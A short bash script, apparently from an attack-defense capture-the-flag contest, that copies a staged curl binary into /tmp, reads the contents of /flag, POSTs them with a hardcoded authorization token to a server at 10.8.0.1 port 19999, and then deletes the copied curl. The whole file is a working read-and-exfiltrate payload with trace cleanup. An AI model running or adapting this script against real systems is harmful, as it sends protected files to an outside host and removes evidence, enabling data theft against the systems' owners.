#!/bin/bash
cp /tmp/safedir/static/curl /tmp
flag1=$(cat /flag)
/tmp/curl -X POST http://10.8.0.1:19999/api/flag -H "Authorization: 1144d0ffa41e4ac766ea371c413da8f0" -d "{ \"flag\": \"$flag1\" }"
rm /tmp/curl

